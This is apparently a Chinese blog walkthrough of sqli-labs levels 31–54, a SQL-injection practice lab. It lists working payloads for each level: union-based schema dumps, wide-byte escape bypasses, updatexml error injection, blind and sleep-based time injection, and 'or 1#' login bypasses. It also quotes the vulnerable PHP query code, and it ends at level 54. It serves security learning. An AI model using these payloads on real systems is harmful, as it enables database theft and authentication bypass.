<h2 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h2><p>和 less-29、less-30一样，就是这次是 )”</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">id=1&amp;id=0&quot;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (information_schema.columns) <span class="hljs-keyword">where</span> (table_schema&gt;=@) <span class="hljs-keyword">and</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>



<h2 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120223906769.png" srcset="/img/loading.gif" lazyload alt="image-20210120223906769"></p>
<p>会被escape，而且推测id的类型为int</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120224114512.png" srcset="/img/loading.gif" lazyload alt="image-20210120224114512"></p>
<p>报错不会回显</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120224307444.png" srcset="/img/loading.gif" lazyload alt="image-20210120224307444"></p>
<p>那就只能试试宽字节了</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=%df%27 <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1%23<br></code></pre></td></tr></table></figure>

<p>成功</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120224418287.png" srcset="/img/loading.gif" lazyload alt="image-20210120224418287"></p>
<p>接下来就是为所欲为了</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=<span class="hljs-meta">%df</span><span class="hljs-meta">%27</span> <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) from information_schema.schemata<span class="hljs-meta">%23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120224738271.png" srcset="/img/loading.gif" lazyload alt="image-20210120224738271"></p>
<h2 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h2><p>还是会escape</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=<span class="hljs-meta">%df</span><span class="hljs-meta">%27</span> <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) from information_schema.schemata<span class="hljs-meta">%23</span><br></code></pre></td></tr></table></figure>

<p>和上局一样</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120225010194.png" srcset="/img/loading.gif" lazyload alt="image-20210120225010194"></p>
<h2 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120225101790.png" srcset="/img/loading.gif" lazyload alt="image-20210120225101790"></p>
<p>变成俩输入了</p>
<p>而且还是会escape</p>
<p> 会报错</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=%df%27 <span class="hljs-keyword">or</span> %23&amp;<span class="hljs-attribute">passwd</span>=admin&amp;submit=Submit<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120225502783.png" srcset="/img/loading.gif" lazyload alt="image-20210120225502783"></p>
<p>所以可以报错注入了</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=%df%<span class="hljs-number">27</span> AND updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select user()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span>&amp;passwd=admin&amp;submit=Submit<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120225634952.png" srcset="/img/loading.gif" lazyload alt="image-20210120225634952"></p>
<h2 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h2><p>还是会escape</p>
<p>闭合</p>
<p><code>?id=%df%27</code> 和 <code>?id=%df&quot;</code> 都报错，说明没有用到引号</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1%23<br></code></pre></td></tr></table></figure>

<p>escape是唬人的</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">0</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) from information_schema.schemata%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120230800220.png" srcset="/img/loading.gif" lazyload alt="image-20210120230800220"></p>
<h2 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h2><p>还是说有escape</p>
<p>闭合</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=%df%27 <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1%23<br></code></pre></td></tr></table></figure>

<p>报错不回显</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=<span class="hljs-meta">%df</span><span class="hljs-meta">%27</span> <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) from information_schema.schemata<span class="hljs-meta">%23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120231310079.png" srcset="/img/loading.gif" lazyload alt="image-20210120231310079"></p>
<h2 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h2><p>两个输入</p>
<p>闭合</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span>==%<span class="hljs-built_in">df</span><span class="hljs-string">&#x27;%23&amp;passwd=admin&amp;submit=Submit</span><br></code></pre></td></tr></table></figure>

<p>有报错回显</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>==%df&#x27; union select 1,group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata%23&amp;<span class="hljs-attribute">passwd</span>=admin&amp;submit=Submit<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120231921648.png" srcset="/img/loading.gif" lazyload alt="image-20210120231921648"></p>
<h2 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h2><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">?id=<span class="hljs-number">0</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120232334394.png" srcset="/img/loading.gif" lazyload alt="image-20210120232334394"></p>
<p>感觉没什么防护</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">0&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (information_schema.columns) <span class="hljs-keyword">where</span> (table_schema&gt;=@) <span class="hljs-keyword">and</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120234746825.png" srcset="/img/loading.gif" lazyload alt="image-20210120234746825"></p>
<h2 id="less-39"><a href="#less-39" class="headerlink" title="less-39"></a>less-39</h2><p>闭合</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1%23<br></code></pre></td></tr></table></figure>

<p>没有引号</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?id=<span class="hljs-number">0</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) from (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) from (information_schema.columns) where (table_schema&gt;=@) and (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%23<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121110723299.png" srcset="/img/loading.gif" lazyload alt="image-20210121110723299"></p>
<h2 id="less-40"><a href="#less-40" class="headerlink" title="less-40"></a>less-40</h2><p>闭合</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27;)<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure>

<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">0&#x27;</span>) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (information_schema.columns) <span class="hljs-keyword">where</span> (table_schema&gt;=@) <span class="hljs-keyword">and</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121111041676.png" srcset="/img/loading.gif" lazyload alt="image-20210121111041676"></p>
<h2 id="less-41"><a href="#less-41" class="headerlink" title="less-41"></a>less-41</h2><p>闭合</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1%23<br></code></pre></td></tr></table></figure>

<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?id=<span class="hljs-number">0</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) from (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) from (information_schema.columns) where (table_schema&gt;=@) and (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%23<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121112018887.png" srcset="/img/loading.gif" lazyload alt="image-20210121112018887"></p>
<h2 id="less-42"><a href="#less-42" class="headerlink" title="less-42"></a>less-42</h2><p>有两个输入</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121112430298.png" srcset="/img/loading.gif" lazyload alt="image-20210121112430298"></p>
<p>无论点击什么，好像都没啥用，这两个输入不知道有没有参与sql语句，试一试</p>
<p><code>login_user=admin&quot;</code> 和 <code>login_user=admin&#39;</code> 都没有什么报错，可能没有注入点，<code>login_password=admin&#39;</code> 就报错了，说明login_passwd可以是注入点</p>
<p>闭合</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">login_user</span>=<span class="hljs-number">1</span>&amp;login_password=admin&#x27;%<span class="hljs-number">23</span>&amp;mysubmit=Login<br></code></pre></td></tr></table></figure>

<p>用报错注入</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">login_user</span>=<span class="hljs-number">1</span>&amp;login_password=admin&#x27;AND updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select user()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span>&amp;mysubmit=Login<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121112932139.png" srcset="/img/loading.gif" lazyload alt="image-20210121112932139"></p>
<p>也可以这样登录admin</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">login_user</span>=admin&amp;login_password=<span class="hljs-number">1</span>&#x27;or <span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121113359396.png" srcset="/img/loading.gif" lazyload alt="image-20210121113359396"></p>
<h2 id="less-43"><a href="#less-43" class="headerlink" title="less-43"></a>less-43</h2><p>闭合</p>
<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">login_user=<span class="hljs-literal">admin</span>&amp;login_password=<span class="hljs-literal">admin</span><span class="hljs-string">&#x27;)%23</span><br></code></pre></td></tr></table></figure>

<p>passwd 是注入点</p>
<p>登录admin账号</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">login_user=admin&amp;login_password=admin&#x27;) or 1<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121113902374.png" srcset="/img/loading.gif" lazyload alt="image-20210121113902374"></p>
<h2 id="less-44"><a href="#less-44" class="headerlink" title="less-44"></a>less-44</h2><p>没有报错，找不到注入点</p>
<p>看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>];<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">if</span> (@<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<br></code></pre></td></tr></table></figure>

<p>知道passwd是注入点</p>
<p>登录admin</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">login_user</span>=admin&amp;login_password=&#x27; <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1#<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121125751221.png" srcset="/img/loading.gif" lazyload alt="image-20210121125751221"></p>
<h2 id="less-45"><a href="#less-45" class="headerlink" title="less-45"></a>less-45</h2><p>用引号靠报错，还是没法找到注入点</p>
<p>看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="hljs-subst">$username</span>&#x27;) and password=(&#x27;<span class="hljs-subst">$password</span>&#x27;)&quot;</span>;<br><span class="hljs-keyword">if</span> (@<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<br></code></pre></td></tr></table></figure>

<p>登录admin</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">login_user=admin&amp;login_password=admin&#x27;)or 1<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121131558315.png" srcset="/img/loading.gif" lazyload alt="image-20210121131558315"></p>
<h2 id="less-46"><a href="#less-46" class="headerlink" title="less-46"></a>less-46</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121131650460.png" srcset="/img/loading.gif" lazyload alt="image-20210121131650460"></p>
<p>有点变化，参数是sort</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">sort</span>=1<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121131739030.png" srcset="/img/loading.gif" lazyload alt="image-20210121131739030"></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">sort</span>=2<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121131823654.png" srcset="/img/loading.gif" lazyload alt="image-20210121131823654"></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">sort</span>=3<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121131931952.png" srcset="/img/loading.gif" lazyload alt="image-20210121131931952"></p>
<p>分别按id、username、password升序排列</p>
<p>可能是用到了order by </p>
<p>报错注入</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">1</span> AND updatexml(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-built_in">select</span> user()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121132459622.png" srcset="/img/loading.gif" lazyload alt="image-20210121132459622"></p>
<h2 id="less-47"><a href="#less-47" class="headerlink" title="less-47"></a>less-47</h2><p>闭合</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">1</span>&#x27;<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure>



<p>直接报错注入</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">1</span>&#x27;AND updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select user()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121135008540.png" srcset="/img/loading.gif" lazyload alt="image-20210121135008540"></p>
<h2 id="less-48"><a href="#less-48" class="headerlink" title="less-48"></a>less-48</h2><p>会报错，但是报错信息不回显</p>
<p>看来只能盲注了</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-built_in">and</span> <span class="hljs-keyword">left</span>(<span class="hljs-keyword">version</span>(),<span class="hljs-number">1</span>)=<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121140852393.png" srcset="/img/loading.gif" lazyload alt="image-20210121140852393"></p>
<h2 id="less-49"><a href="#less-49" class="headerlink" title="less-49"></a>less-49</h2><p>闭合</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">2</span>&#x27;<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure>

<p>报错不回显</p>
<p>一样用盲注</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">2</span>&#x27; and left(version(),<span class="hljs-number">1</span>)=<span class="hljs-number">5</span><span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121141804847.png" srcset="/img/loading.gif" lazyload alt="image-20210121141804847"></p>
<h2 id="less-50"><a href="#less-50" class="headerlink" title="less-50"></a>less-50</h2><p>回显报错</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">2</span> AND updatexml(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-built_in">select</span> user()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121142547017.png" srcset="/img/loading.gif" lazyload alt="image-20210121142547017"></p>
<h2 id="less-51"><a href="#less-51" class="headerlink" title="less-51"></a>less-51</h2><p>闭合</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">2</span>&#x27;<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure>

<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">2</span>&#x27;AND updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select user()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure>

<p>报错注入</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121142832726.png" srcset="/img/loading.gif" lazyload alt="image-20210121142832726"></p>
<h2 id="less-52"><a href="#less-52" class="headerlink" title="less-52"></a>less-52</h2><p>不回显报错</p>
<p>盲注</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">?<span class="hljs-keyword">sort</span>=<span class="hljs-number">2</span> <span class="hljs-built_in">and</span> <span class="hljs-keyword">left</span>(<span class="hljs-keyword">version</span>(),<span class="hljs-number">1</span>)=<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121143303034.png" srcset="/img/loading.gif" lazyload alt="image-20210121143303034"></p>
<h2 id="less-53"><a href="#less-53" class="headerlink" title="less-53"></a>less-53</h2><p>闭合</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">2</span>&#x27;<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure>

<p>报错不回显</p>
<p>无论sort等于什么，都回显同样的内容，也没办法布尔盲注了，只能时间盲注了</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?sort=<span class="hljs-number">1</span>&#x27;<span class="hljs-keyword">and</span> <span class="hljs-constructor">If(<span class="hljs-params">ascii</span>(<span class="hljs-params">substr</span>(<span class="hljs-params">database</span>()</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>))%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>





<h2 id="less-54"><a href="#less-54" class="headerlink" title="less-54"></a>less-54</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121145644986.png" srcset="/img/loading.gif" lazyload alt="image-20210121145644986"></p>
<p>要从CHALLENGES 这个database中找出secret key的值</p>
<p>用id作注入点</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">?id=<span class="hljs-number">0</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121150912785.png" srcset="/img/loading.gif" lazyload alt="image-20210121150912785"></p>
<p> 接下来要看challenges的表名、字段名</p>
<p>使用超级payload</p>
